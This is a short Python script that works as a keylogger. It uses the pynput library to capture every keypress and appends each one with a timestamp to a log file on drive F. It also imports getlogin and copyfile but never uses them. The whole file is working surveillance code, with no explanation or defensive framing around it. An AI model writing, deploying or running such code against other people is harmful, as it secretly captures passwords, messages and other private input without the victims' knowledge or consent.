from pynput.keyboard import Listener

import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_directory = f"F:\Documenten"

logging.basicConfig(filename=f"{logging_directory}/mylogs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def keyhandler(key):
    logging.info(key)

with Listener(on_press=keyhandler) as listener:
    listener.join()